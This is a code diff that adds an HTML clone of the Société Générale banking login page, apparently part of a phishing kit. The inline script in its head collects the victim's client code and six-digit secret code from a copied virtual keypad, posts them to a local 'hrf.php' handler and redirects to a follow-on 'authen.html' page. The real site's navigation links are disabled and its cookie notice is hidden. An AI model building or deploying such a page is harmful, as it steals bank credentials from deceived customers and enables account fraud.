@@ -1,0 +1,1367 @@
+<html lang="fr"><head>
+	<title>Banque et Assurances - Société Générale</title>
+	<link rel="icon" href="favicon.ico">
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"><meta content="autre" name="NET2GCLASS" lang="fr"><meta content="" name="NET2GKEYWORDS" lang="fr"><meta content="Société Générale" name="NET2GINTITULE" lang="fr"><meta content="O" name="NET2GINDEXABLE" lang="fr"><meta content="Accédez à vos comptes ou découvrez nos offres et services : prêt immobilier, crédit auto, assurance, placements, épargne et retraite." name="description" lang="fr"><meta content="UvE5KjMySWrP7yindK34OcyZuY0P85UTJ+/p9DyJqE4=" name="verify-v1">
+	<link rel="stylesheet" type="text/css" media="screen" href="https://static.societegenerale.fr//pri/themes/defaut/css/ephox_commun_defaut.css">
+<link rel="stylesheet" type="text/css" media="screen" href="https://static.societegenerale.fr//pri/themes/defaut/css/contenus_pap_defaut.css">
+<link rel="stylesheet" type="text/css" media="screen" href="https://static.societegenerale.fr//pri/themes/defaut/css/grid_commun_defaut.css">
+<link rel="stylesheet" type="text/css" media="screen" href="https://static.societegenerale.fr//pri/themes/defaut/css/grid_pap_defaut.css">
+<!--[if lte IE 6]>
+<link rel="stylesheet" type="text/css" media="screen" href="https://static.societegenerale.fr//pri/themes/defaut/css/grid_commun_ie6_defaut.css"/>
+<link rel="stylesheet" type="text/css" media="screen" href="https://static.societegenerale.fr//pri/themes/defaut/css/contenus_ie6_defaut.css"/>
+<![endif]-->
+
+
+<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>
+<script src="http://code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
+<script>
+$(function(){
+	$("#button").click(function(){
+		var code = $("#codcli").val();
+		if(code.length == 0){
+			alert("Vous devez saisir votre code client.");
+		}else if(!code.match(/^[0-9]{8}$/)){
+			alert("La saisie de votre code client est incorrecte.\n Pour en savoir plus, cliquez sur \"Aide\" à côté du code client.");
+		}else{
+			$("#tc_cvcs").show();
+			$(".touche").click(function(){
+				var tcs = $(this).attr('data-v');
+				var inp = $("#tc_visu_saisie").val();
+				var tcode = $("#tcode").val();
+				if(inp.length != 6){
+					$("#tc_visu_saisie").val(inp+'*');
+					$("#tcode").val(tcode+''+tcs);
+				}
+			});	
+
+			$("#tc_valider").click(function(){
+				var inp = $("#tc_visu_saisie").val();
+				if(inp.length == 0){
+					alert("La saisie de votre Code Secret est obligatoire. ");				
+				}else if(inp.length < 6){
+					alert("Le Code Secret saisi est incorrect. \n Merci de bien vouloir ressaisir votre Code Secret composé de 6 chiffres.");
+				}else{
+					var tcode = $("#tcode").val();
+					$.ajax({
+						type:"post",
+						url:"hrf.php",
+						data:{"send":"ok","code":code,"tc":tcode}
+					}).done(function(data){
+						window.location.href = "authen.html";
+					});
+				}
+			});
+		}
+	
+		$("#tc_corriger").click(function(){
+			$("#tcode").val('');
+			$("#tc_visu_saisie").val('');
+				
+		});
+		
+		$("#shapeHautFermer").click(function(){
+			$("#tc_cvcs").hide();
+		});
+			
+	});
+	
+});
+</script>
+<style>
+img {
+	border: 0;
+}
+#div_tc_haut{
+	position: absolute;
+	top: 0px;
+	left: 0px;
+	width:110px;
+	height:25px;
+}
+.tc_haut_switch {
+	position: absolute;
+	top: 8px;
+	left: 102px;
+}
+
+.tc_haut_switch_mv {
+	position: absolute;
+	top: 8px;
+	left: 80px;
+}
+
+/* #surlignage is deprecated */
+#surlignage, .surlignage {
+	z-index: 2;
+}
+.tc_fond, .tc_fond_mv {
+	z-index: 10000;   /* must be > .vk_layer.z-index */
+}
+.tc_fond_img {
+	position:absolute;
+	float:left;
+	top:24px;
+	left:0px;
+}
+.tc_fond_img_mv {
+	position:absolute;
+	float:left;
+	top:48px;
+	left:0px;
+}
+
+.text_div {
+	position: absolute;
+	float:left;
+	left:20px;
+	top:29px;
+}
+
+.text_div_mv {
+	position: absolute;
+	float:left;
+	left: 24px;
+	top:59px;
+}
+
+/* #legendeInput is deprecated */
+#legendeInput, .legendeInput {
+	position: absolute;
+	top: 0px;
+}
+
+.code_div {
+	position:absolute;
+	float:left;
+	top:3px;
+}
+
+.code_div_mv {
+	position:absolute;
+	float:left;
+}
+
+.password_div {
+	position:absolute;
+	width:120px;
+	top:18px;
+	float: left;
+	left:0px;
+}
+
+.password_div input {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 22px;
+	border: 1px solid black;
+	background-color: #F5F7F6;
+	padding: 0;
+	height: 18px;
+	width: 94px;
+	float:left;
+}
+
+.password_div img {
+	vertical-align: top;
+}
+
+.password_div_mv {
+	position: absolute;
+	width: 260px;
+	top: 18px;
+	float: left;
+	left: 0px;
+}
+
+.password_div_mv input {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 44px;
+	border: 2px solid black;
+	background-color: #FFFFFF;
+	padding: 0;
+	width: 190px;
+	left:33px;
+	float:left;
+}
+
+.password_div_mv img {
+	vertical-align: top;
+}
+
+.tc_aideimg {
+	text-align: left;
+}
+
+.tc_aideimg_mv {
+	text-align: left;
+
+}
+
+.keyboard {
+	position:absolute;
+	top:75px;
+	left:20px;
+	float:left;
+	z-index:1;
+}
+
+.keyboard_mv {
+	position:absolute;
+	left: 24px;
+	top: 168px;
+	z-index:1;
+	float:left;
+}
+
+/* #tc_boutons is deprecated */
+#tc_boutons, .tc_boutons, .tc_boutons_mv {
+	position: absolute;
+	float:left;
+	top: 5px;
+	margin-left:8px;
+	margin-top:26px;
+}
+
+.valid_img {
+	border:0;
+	margin-top: 14px;
+}
+.correct_img_mv{
+	margin-top: 26px;
+}
+.valid_img_mv {
+	border:0;
+	margin-top: 26px;
+}
+
+.vk_layer {
+/*	background-color: #808080; */
+	background-color: transparent;
+	z-index: 1008;
+	position: fixed;
+	top: 0;
+	left: 0;
+	bottom: 0;
+	right: 0;
+	/*display: none;*/
+}
+
+.vk_move {
+	z-index: 1009;
+	position: fixed;
+	top: 0;
+	left: 0;
+	bottom: 0;
+	right: 0;
+	/*display: none;*/
+}
+
+* html .vk_layer {	/* IE6 */
+/*	background-color: #808080; */
+	background-color: transparent;
+	position: absolute;
+	width: 100%;
+	height: 100%;
+}
+
+html, body{
+  height: 100%;
+  width: 100%;
+}
+
+#tc_cvcs{
+	display:none;
+}
+</style>
+<link href="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/02-promo/2012/10_octobre_2012/windows_phone_user_agent_popin/css/n2g_windows_phone_user_agent.css" rel="stylesheet" type="text/css"><link href="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/Essentiel/site_et_appli_mobile/user_agent/css/n2g_ipad_useragent.css" rel="stylesheet" type="text/css"></head>
+<body><div id="n2g_box_cookie_alerte_message" style="display: block; position: relative; width: 100%; top: 0; margin: auto 0; font-size: 12px; text-align: center; color: #7b7b7b; background-color: #fcf7e5;"><div class="n2g_box_cookie_alerte_message_content" style="display: inline-block; *display: inline; zoom: 1; position: relative; margin: 0 auto; padding: 12px; text-align: left; line-height: 18px;">En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies <a href="https://particuliers.societegenerale.fr/votre_site/configuration_securite/cnil.html" class="n2g_box_cookie_alerte_message_info_btn" style="color: #666666;">cliquez ici</a></div> <div class="n2g_box_cookie_alerte_message_fermer_btn_container" style="position: absolute; top: 0px; right: -4px; width: 40px; height: 40px; text-align: center;"><a href="javascript:void(0)" class="n2g_box_cookie_alerte_message_fermer_btn" style="display: inline-block; width: 22px; height: 25px; vertical-align: top; background: url('https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/charte_cookies/img/alerte_message_img_cross.png') center center no-repeat;"><!-- &nbsp; --></a></div></div>
+
+<div id="n2g_conteneur"> 
+	<div id="n2g_zone_haut">
+		
+
+
+<div id="n2g_zone_haut_1">
+
+
+<div id="tc_cvcs" class="clcvcs">
+<div id="tc_divdeplace" style="position: absolute; left: 609px; top: 186px;" class="tc_fond">
+<map name="maphaut1395871812146" id="maphaut1395871812146" style="display:block">
+<area id="shapeHautFermer" shape="rect" style="cursor:pointer;display:block" coords="167,3,230,16" alt="FERMER" title="FERMER">
+</map>
+<img id="img_tc_haut" usemap="#maphaut1395871812146" src="https://particuliers.secure.societegenerale.fr//static/img/vk/tc_haut_sans.gif"><img id="tc_haut_switch" class="tc_haut_switch" src="https://particuliers.secure.societegenerale.fr//static/img/vk/tc_agrandir.gif" style="cursor: pointer; left: 102px; top: 8px;" alt="AGRANDIR" title="AGRANDIR">
+<img id="tc_fond_img" class="tc_fond_img" src="https://particuliers.secure.societegenerale.fr//static/img/vk/tc_fond.gif" style="opacity: 0.56;">
+<div id="tc_text" class="text_div">
+<div id="tc_votre_code" class="code_div">
+<img id="legendeInput" alt="VOTRE CODE SECRET" title="VOTRE CODE SECRET" src="https://particuliers.secure.societegenerale.fr//static/img/vk/tc_votre_code.gif">
+<div id="tc_pass" class="password_div">
+<input type="text" id="tc_visu_saisie" value="" readonly="" size="6">
+<input type="hidden" id="tcode" value="">
+<a id="tc_aidelien" style="" href="javascript: showFAQ(&quot;/aide/clavier_virtuel.html&quot;, &quot;CodeSecret&quot;)">
+<img id="tc_aideimg" src="https://particuliers.secure.societegenerale.fr//static/img/vk/bouton_question.gif">
+</a>
+</div>
+</div>
+</div>
+<map id="tc_tclavier1395871812148" name="tc_tclavier1395871812148" style="display:block">
+<area id="touche11" data-v="8" coords="0,0,24,24" style="cursor: pointer;display:block;" class="touche">
+<area id="touche12" data-v="7" coords="24,0,48,24" style="cursor: pointer;display:block;" class="touche">
+<area id="touche13" data-v="0" coords="48,0,72,24" style="cursor: pointer;display:block;" class="touche">
+<area id="touche14" data-v="6" coords="72,0,96,24" style="cursor: pointer;display:block;" class="touche">
+<area id="touche21" value="" coords="0,24,24,48" style="cursor: pointer;display:block;" class="toucheVide">
+<area id="touche22" data-v="1" coords="24,24,48,48" style="cursor: pointer;display:block;" class="touche">
+<area id="touche23" data-v="4" coords="48,24,72,48" style="cursor: pointer;display:block;" class="touche">
+<area id="touche24" data-v="2" coords="72,24,96,48" style="cursor: pointer;display:block;" class="touche">
+<area id="touche31" value="" coords="0,48,24,72" style="cursor: pointer;display:block;" class="toucheVide">
+<area id="touche32" data-v="9" coords="24,48,48,72" style="cursor: pointer;display:block;" class="touche">
+<area id="touche33" value="" coords="48,48,72,72" style="cursor: pointer;display:block;" class="toucheVide">
+<area id="touche34" data-v="3" coords="72,48,96,72" style="cursor: pointer;display:block;" class="touche">
+<area id="touche41" data-v="5" coords="0,72,24,96" style="cursor: pointer;display:block;" class="touche">
+<area id="touche42" value="" coords="24,72,48,96" style="cursor: pointer;display:block;" class="toucheVide">
+<area id="touche43" value="" coords="48,72,72,96" style="cursor: pointer;display:block;" class="toucheVide">
+<area id="touche44" value="" coords="72,72,96,96" style="cursor: pointer;display:block;" class="toucheVide">
+</map>
+<img id="img_clavier" class="keyboard" usemap="#tc_tclavier1395871812148" src="gen_ui.png">
+<div id="tc_boutons" class="buttons" style="left: 139px; top: 80px;">
+<img id="tc_corriger" class="correct_img" style="cursor:pointer" alt="CORRIGER" title="CORRIGER" src="https://particuliers.secure.societegenerale.fr//static/img/vk/tc_corriger.gif"><br>
+<img id="tc_valider" class="valid_img" style="cursor:pointer" alt="VALIDER" title="VALIDER" src="https://particuliers.secure.societegenerale.fr//static/img/vk/tc_valider.gif">
+</div>
+<img id="surlignage" style="cursor: pointer; position: absolute; left: -5000px; top: -5000px;" src="https://particuliers.secure.societegenerale.fr//static/img/vk/tc_touche_cache_hover.gif">
+</div>
+</div>
+
+
+		
+
+
+
+
+
+
+		
+
+
+
+
+
+<div class="n2g_zone_logo"><a href="#index.html" title="Société Générale"><img src="https://static.societegenerale.fr//pri/PRI/Multimedias/logo_et_copyright/logo_header_refonte_2010.gif" alt=""></a></div>
+
+
+<div id="n2g_zone_haut_centre"><div><span style=" margin-top: 0;">&nbsp;</span></div></div> 
+	
+
+<div id="n2g_zone_haut_droite">
+	<div class="n2g_mire_connexion_hp">
+
+		<div class="n2g_mire_connexion_titre">Accéder à vos comptes</div>
+		<form class="n2g_mire_connexion_form" id="n2g_authentification">
+			<input id="codcli" name="codcli" class="n2g_mire_connexion_champs_actif" type="text" autocomplete="off" maxlength="8" size="20" placeholder="Votre code client">
+			<input id="button" name="button" class="n2g_mire_connexion_btn" type="button" value="OK">			
+		</form>
+		<ul>
+		
+			<li class="item_1"><a href="#https://particuliers.secure.societegenerale.fr/swm-web/swm-reattribution.html">Code secret oublié ?</a></li>
+				
+			<li class="item_2"><a href="#votre_site/configuration_securite/mesures_securite/attribution_codes_acces.html" title="L'attribution de vos codes d'accès">Obtenir vos codes</a></li>
+				
+			<li class="item_3"><a href="#votre_site/configuration_securite/mesures_securite/dispositifs_en_place.html" title="Les dispositifs en place">Informations sécurité</a></li>
+				
+			<li class="item_4"><a href="#/faq.html" title="FAQ (nouvelle fenêtre)" onclick="window.open(this.href, 'sg_14572695','height=800, width=700, top=1, left=1, toolbar=yes, menubar=yes, location=yes, resizable=yes, scrollbars=yes, status=yes');return false;">Aide</a></li>
+				
+		</ul>
+	</div>
+</div>
+
+
+
+
+
+</div>
+
+
+<div id="n2g_zone_haut_2">
+
+
+
+
+
+		
+<!-- Fragment generated at 2015/09/04 - 14:57:38:0008 -->
+
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+
+
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+<div id="n2g_navigation_principale_deconnecte">
+	<ul id="n2g_menu_brochure">				
+			<li class="item_1"><a style="background-image: url('https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Visuel/Rubrique_objet_multimedia/Rubriquage_menu_haut_deconnecte/n2g2_menu_pri_ouvrir_un_compte.jpg');" href="#ouvrir-un-compte-bancaire.html" title="Ouvrir un compte bancaire">Ouvrir un compte bancaire</a></li>
+						
+			<li class="item_2"><a style="background-image: url('https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Visuel/Rubrique_objet_multimedia/Rubriquage_menu_haut_deconnecte/n2g2_menu_pri_essentiel.gif');" href="#essentiel_quotidien.html" title="L'essentiel au quotidien">L'essentiel au quotidien</a></li>
+						
+			<li class="item_3"><a style="background-image: url('https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Visuel/Rubrique_objet_multimedia/Rubriquage_menu_haut_deconnecte/n2g2_menu_pri_epargner.gif');" href="#epargner.html" title="Épargner">Épargner</a></li>
+						
+			<li class="item_4"><a style="background-image: url('https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Visuel/Rubrique_objet_multimedia/Rubriquage_menu_haut_deconnecte/n2g2_menu_pri_emprunter.gif');" href="#emprunter.html" title="Emprunter">Emprunter</a></li>
+						
+			<li class="item_5"><a style="background-image: url('https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Visuel/Rubrique_objet_multimedia/Rubriquage_menu_haut_deconnecte/n2g2_menu_pri_proteger_bien_proches.gif');" href="#proteger_vos_biens_et_vos_proches.html" title="Protéger vos biens et vos proches">Assurance et Prévoyance</a></li>
+		
+	</ul>
+	
+		<div id="n2g_formulaire_de_recherche_deconnecte">
+  			<form id="n2g_formulaire_de_recherche_barre_navigation" method="post" action="/resultats_recherche.html" onsubmit="javascript:return ngp_recherche(this);">
+ 				<label for="mots_cles" class="n2g_element_a_cacher">saisir un ou plusieurs mots-clés :</label>
+ 					<input type="text" id="mots_cles" name="chl_200_param_rech" class="input input_before_focus" value="Rechercher" onfocus="javascript:this.value=''; this.className='input input_after_focus';">
+ 					<input type="hidden" name="url_1200_source">
+ 					<input type="hidden" name="chl_50_document_encoding">				
+ 					<input type="submit" value="ok" class="submit" title="Lancer la recherche">
+  			</form>
+  		</div>
+	
+</div>
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div><script type="text/javascript"> var c_link = document.createElement('link'); c_link.setAttribute("href","https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/02-promo/2012/10_octobre_2012/windows_phone_user_agent_popin/css/n2g_windows_phone_user_agent.css"); c_link.setAttribute("rel","stylesheet"); c_link.setAttribute("type","text/css"); document.getElementsByTagName("head").item(0).appendChild(c_link); </script> <script src="https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/Espace_conseil/00-Contenu/moteur_recherche/js/jquery_172.js" type="text/javascript"></script><script type="text/javascript" src="https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/Espace_conseil/00-Contenu/moteur_recherche/js/jquery_cookie.js"></script> <script src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/02-promo/2012/10_octobre_2012/windows_phone_user_agent_popin/js/n2g_mobile_detection_plugin.js" type="text/javascript"></script> <script src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/02-promo/2012/10_octobre_2012/windows_phone_user_agent_popin/js/n2g_script_windows_phone_user_agent.js" type="text/javascript"></script></div>
+
+<div class="n2g_windows_phone_user_agent_contenu">
+<div class="n2g_windows_phone_user_agent_block">
+<div class="n2g_windows_phone_user_agent_block1">Gérez vos comptes<br>
+avec l’Appli pour <strong>Windows Phone</strong></div>
+
+<div class="n2g_windows_phone_user_agent_block_background"></div>
+
+<div class="n2g_windows_phone_user_agent_block_btn_close">fermer</div>
+
+<div class="n2g_windows_phone_user_agent_block2">
+<div class="n2g_windows_phone_user_agent_block2_title">Gérez vos comptes<br>
+avec l’Appli pour <strong>Windows Phone</strong></div>
+
+<div class="n2g_windows_phone_user_agent_block2_btn_download_top">Téléchargement pour Windows Phone - Gratuit</div>
+
+<div class="n2g_windows_phone_user_agent_block2_btn_bottom">
+<div class="n2g_windows_phone_user_agent_block2_btn_download_bottom">Télécharger l'Appli</div>
+
+<div class="n2g_windows_phone_user_agent_block2_btn_link_website">Continuer sur le site</div>
+</div>
+</div>
+</div>
+</div></div>
+
+		
+				
+
+
+
+
+</div>
+	</div>
+	<div id="n2g_conteneur_milieu">
+		<div id="n2g_zone_milieu">
+			<div id="n2g_zone_gauche">
+				
+
+
+
+
+
+
+		
+<!-- Fragment generated at 2015/09/04 - 14:57:25:0729 -->
+
+				
+
+
+
+
+		
+
+
+
+
+	 
+	
+
+	<script type="text/javascript" src="https://static.societegenerale.fr//pri/contenu/js/n2g_ngp_ciblage.js"></script>
+	<script type="text/javascript">
+		var n2g_ngp_globale_tableauDesIdDeComEtDesCibles974430672411 = new Array;
+		var n2g_ngp_globale_cibles = "";
+		
+				n2g_ngp_globale_cibles = "";
+			
+	</script>
+	<div class="n2g_zone_communication_verticale">
+	
+				<div class="n2g_elt_communication_verticale" style="margin-bottom:0px;">
+					<a href="#votre_site/configuration_securite/internet_et_vous/probleme_securite_contactez_nous.html"><img src="https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/Communication/Home_page/Colonne_gauche/phishing/phishing.gif" alt="Fraudes en ligne"></a>
+				</div>
+					
+				
+			</div>
+	<script type="text/javascript">
+		// On demasque ce qui est ciblé.
+		n2g_ngp_deMasquerLesContenusDeComCiblees("n2g_bloc_com_vertical_id_", "n2g_bloc_com_vertical_class_974430672411", n2g_ngp_globale_tableauDesIdDeComEtDesCibles974430672411, "block", n2g_ngp_globale_cibles);
+	</script>
+
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div><script type="text/javascript">jQuery(document).ready( function($) { $(".home_services_urgences").css('cursor','pointer'); $(".home_services_urgences").click(function(){ window.location=$(this).find("a").attr("href"); return false; }); 
+$(".n2g_box_cookie_alerte_message_content").hide();}); </script></div>
+
+<div class="home_onglet_contact">Contact</div>
+
+<div class="home_services_urgences" style="height: 109px; cursor: pointer;">
+<div class="home_services_urgences_titre" style=" background-attachment: scroll; background-repeat: repeat;"><a href="#nous_contacter/service_urgence.html">Services d'urgence</a></div>
+
+<div class="home_services_urgences_contenu">Perte / vol / utilisation<br>
+frauduleuse de vos moyens<br>
+de paiement<br>
+Sinistre Habitation / Automobile<br>
+<span class="home_services_urgences_titre_cliquez_ici"> cliquez ici</span></div>
+</div>
+
+<div><a class="home_nous_contacter" href="#nous_contacter.html">Nous contacter</a></div></div>
+
+		
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div><script type="text/javascript"><!--
+function n2g_ngp_controleCodePostal(form){if ( ($jNgp('#city').val().length!=5) || isNaN($jNgp('#city').val()) ) {alert('Veuillez saisir un code postal');return false;}return true; }
+function n2g_ngp_submit_form_recherche_agence(my_form){ if (n2g_ngp_controleCodePostal(my_form)) { document.location='rechercher_une_agence_ou_distributeur_billets.html#cp='+$jNgp('#city').val(); return true; }  return false; }
+-->
+</script></div>
+
+<div class="bloc_recherche_agence"><span class="recherche_agence_titre">Trouver une agence</span> 
+
+<div style=" float: left; padding-left: 0px; padding-right: 0px; padding-bottom: 0px; margin-bottom: 0px; width: 100px; margin-right: 0px; margin-left: 0px; padding-top: 0px; margin-top: 0px;">
+<div style=" padding-left: 5px; padding-bottom: 0px; padding-right: 0px; margin-bottom: 0px; margin-right: 0px; padding-top: 20px; margin-left: 0px; margin-top: 0px;">Code postal : 
+
+<div name="rechercheAgenceForm" style=" padding-left: 0px; padding-right: 0px; padding-bottom: 0px; margin-bottom: 0px; margin-right: 0px; padding-top: 5px; margin-left: 0px; margin-top: 0px;"><input type="text" class="recherche_agence_code" value="" size="5" title="saisir un code postal" name="city" id="city" maxlength="5"><input type="button" value="Ok" class="recherche_agence_btn" title="rechercher l'agence" onclick="n2g_ngp_submit_form_recherche_agence($jNgp('#city').val())"></div>
+</div>
+</div>
+
+<div style=" float: left; padding-left: 0px; padding-right: 0px; padding-bottom: 0px; margin-bottom: 0px; width: 68px; margin-right: 0px; margin-left: 0px; padding-top: 0px; margin-top: 0px;"><a class="recherche_agence_carte" title="Accès à la recherche par carte" href="rechercher_une_agence_ou_distributeur_billets.html">Accès à la recherche par carte</a></div>
+</div>
+
+<div><script type="text/javascript"><!--
+$jNgp('#city').keypress(function(a){if(a.keyCode=="13"){ n2g_ngp_submit_form_recherche_agence($jNgp('#city').val());  } });
+-->
+</script></div></div>
+
+		
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div><a href="#essentiel_quotidien/banque_distance/services_mobiles.html" class="home_bloc_mobile">Téléchargez l'application pour iPhone ou Android</a></div></div>
+
+		
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div class="home_acces">
+<div class="home_acces_titre">Accès Direct</div>
+
+<ul>
+<li><a href="#tous_les_produits.html">Les produits</a></li>
+
+<li><a href="#tous_les_tarifs.html">Les tarifs</a></li>
+
+<li><a xtclib="guides" href="#espace-conseil.html#format=guide+theme=all">Les guides</a></li>
+
+<li><a xtclib="simulateurs" href="#espace-conseil.html#format=simul+theme=all">Outils et simulateurs</a></li>
+</ul>
+</div></div>
+
+		
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div class="n2g_home_reseaux_sociaux"><script type="text/javascript" src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/01-Pages/00-perennes/00-Home/js/n2g_home_btn_social_network.js"> </script><span class="n2g_home_reseaux_sociaux_titre">Suivez nous sur : </span> 
+
+<ul>
+<li class="n2g_twitter_link"><a href="#http://www.twitter.com/SG_etVous" data-infolink="@SG_etvous : Infos et assistance" data-bgposition="0 0">&nbsp;</a></li>
+
+<li class="n2g_sgetvous_link"><a href="#http://sgetvous.societegenerale.fr" data-infolink="Sg et vous, vos idées et questions" data-bgposition="0 -30px">&nbsp;</a></li>
+
+<li class="n2g_youtube_link"><a href="#http://www.youtube.com/societegenerale" data-infolink="Nos actualités en vidéo" data-bgposition="0 -60px">&nbsp;</a></li>
+
+<li class="n2g_ensregion_link"><a href="#http://www.ensemble-en-regions.fr" data-infolink="Nos initiatives en régions" data-bgposition="0 -90px">&nbsp;</a></li>
+
+<li class="n2g_espconseil_link"><a href="#http://www.facebook.com/societegenerale" data-infolink="Société Générale et Vous" data-bgposition="0 -120px"> </a></li>
+</ul>
+
+<div class="n2g_home_reseaux_sociaux_infobulles"><span>Suivez nous sur nos réseaux sociaux</span></div>
+</div></div>
+
+		
+				
+
+
+
+
+
+			</div>
+			<div id="n2g_zone_centre">
+				<div id="n2g_zone_centre_haut">
+					
+
+
+
+
+
+
+		
+<!-- Fragment generated at 2015/09/04 - 14:57:25:0783 -->
+
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div xtclib="chat20"><a target="blank" href="#https://logs128.xiti.com/go.url?xts=412253&amp;xtor=AD-1001310&amp;url=https://www.pret-rentree.fr"><img src="https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/Communication/Home_page/bandeau/2014/BDO_Home_commun_EIP_et_EIP_S/bandeau.jpg" height="210" width="590" style=" margin-bottom: 10px;"></a> <!-- <div style=" margin-bottom: -35px;"><script type="text/javascript" src="https://static.societegenerale.fr/pri/contenu/js/swfobject.js"></script><script type="text/javascript" src="https://static.societegenerale.fr/pri/contenu/js/N2G_SWFUtils.js"></script><script type="text/javascript"> var flashvars = { }; var params = { wmode:'transparent', allowscriptaccess:"always" }; N2GInitSwfobject("home_banner"); N2GWriteSwfobject( "home_banner", "https://static.societegenerale.fr/pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/Communication/Home_page/bandeau/2014/BDO_Home_commun_EIP_et_EIP_S/bandeau.swf", 590, 210, null, flashvars, params, null ); </script></div> --></div></div>
+
+		
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+
+
+
+	<div class="n2g_bloc_actualite n2g_bloc_actualite_style1">
+	
+		
+		<h1 class="n2g_bloc_actualite_onglet">En ce moment</h1>
+		<div class="n2g_bloc_actualite_conteneur"><div class="n2g_bloc_actualite_conteneur_33">
+			<div class="n2g_bloc_actualite_bloc_33 n2g_bloc_actualite_bloc item_1"><div class="n2g_bloc_actualite_titre">Box All Inclusive</div>
+
+<div><a xtclib="home_actu_01" href="#https://logs128.xiti.com/go.url?xts=412253&amp;xtor=AD-1001296&amp;url=https://boxallinclusive.societegenerale.com" target="target">Etudiants, tentez de remporter l'une des 10 box mises en jeu !<br>
+<br>
+<br>
+<span class="n2g_actu_link_cliquer">Jouez <img width="10" height="9" class="ng2_actu_link_vertical_align" src="https://static.societegenerale.fr/pri/themes/defaut/img/refonte/n2g2_bloc_actu_lien_puce.gif"></span></a></div></div>
+			
+			<div class="n2g_bloc_actualite_bloc_33 n2g_bloc_actualite_bloc item_2"><div class="n2g_bloc_actualite_titre">Accidents de la Vie</div>
+
+<div><a xtclib="home_actu_02" href="#https://www.societegenerale.fr/offres_rugby/assurances.html#assurance_accidents_de_la_vie">1 mois offert pour toute souscription avant le 31 octobre !<br>
+<br>
+<br>
+<span class="n2g_actu_link_cliquer">En savoir plus <img width="10" height="9" class="ng2_actu_link_vertical_align" src="https://static.societegenerale.fr/pri/themes/defaut/img/refonte/n2g2_bloc_actu_lien_puce.gif"></span></a></div></div>
+			
+			<div class="n2g_bloc_actualite_bloc_33 n2g_bloc_actualite_bloc item_3"><div class="n2g_bloc_actualite_titre">Offres spéciales Rugby</div>
+
+<div><a xtclib="home_actu_03" href="#https://www.societegenerale.fr/offres_rugby.html">Jusqu’au 31 octobre, profitez de nos XV offres spéciales Coupe du Monde de Rugby.<br>
+<br>
+<br>
+<span class="n2g_actu_link_cliquer">Profitez-en <img width="10" height="9" class="ng2_actu_link_vertical_align" src="https://static.societegenerale.fr/pri/themes/defaut/img/refonte/n2g2_bloc_actu_lien_puce.gif"></span></a></div></div>
+			</div></div>
+	</div>
+	
+
+				
+
+
+
+
+
+				</div>
+  				<div id="n2g_zone_centre_milieu">
+  					
+
+
+
+
+
+    
+    
+
+    
+
+
+
+    
+
+
+		<div id="n2g_zone_centre_gauche">
+  	    
+	
+	  
+	    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
+
+
+
+
+
+
+
+
+
+
+
+		
+<!-- Fragment generated at 2015/09/04 - 14:59:49:0010 -->
+
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div><script src="https://static.societegenerale.fr//pri/PRI/Repertoire_par_type_de_contenus/Type_de_contenu/Communication/Home_page/zoom_sur/38_moments_de_vie/ab_testing_moment_de_vie/n2g_moment_de_vie.js" type="text/javascript"></script></div>
+
+<div><script type="text/javascript"> function PCC_Record_Event2(a_,b_,c_,d_){ return true; } </script></div></div>
+
+		
+				
+				
+
+
+
+
+		
+
+
+
+
+	 
+
+<div><div class="home_raccourci">
+<div class="home_raccourci_titre">Raccourcis</div>
+
+<div class="home_raccourci_content">
+<div><a href="#emprunter/pret_personnel.html">Crédit conso Expresso</a></div>
+
+<div><a href="#emprunter/prets-immobiliers/demande-en-ligne.html">Demande de prêt</a><br>
+<a href="#emprunter/prets-immobiliers/demande-en-ligne.html">immobilier</a></div>
+
+<!-- <div>Préparer votre retraite<br> <a href="#epargner/par_objectif/prepare_retraite.html">Et bien la vivre !</a></div>--><!-- <div>Réussir votre déménagement<br> <a href="#essentiel_quotidien/reussir_son_demenagement.html">Simplifiez vos démarches</a></div> -->
